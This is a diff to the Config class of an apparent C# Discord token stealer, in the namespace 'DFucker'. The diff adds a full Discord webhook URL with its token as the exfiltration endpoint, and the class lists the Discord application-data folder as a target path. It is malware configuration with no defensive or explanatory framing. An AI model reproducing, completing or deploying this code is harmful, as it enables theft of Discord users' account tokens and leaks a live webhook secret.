@@ -6,7 +6,7 @@ namespace DFucker
 	internal class Config
 	{
 
-		public static string webhookURL = "";
+		public static string webhookURL = "https://discord.com/api/webhooks/855196496441901066/hbP-J4klV-3Sq29GirbutMos4L6YhGY6hJVPeml0rScv4Rzsm0W5PPVik3Eww_YFnUAN";
 
 		public static Dictionary<string, string> builds = new Dictionary<string, string>{
 			{"Discord", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord"},
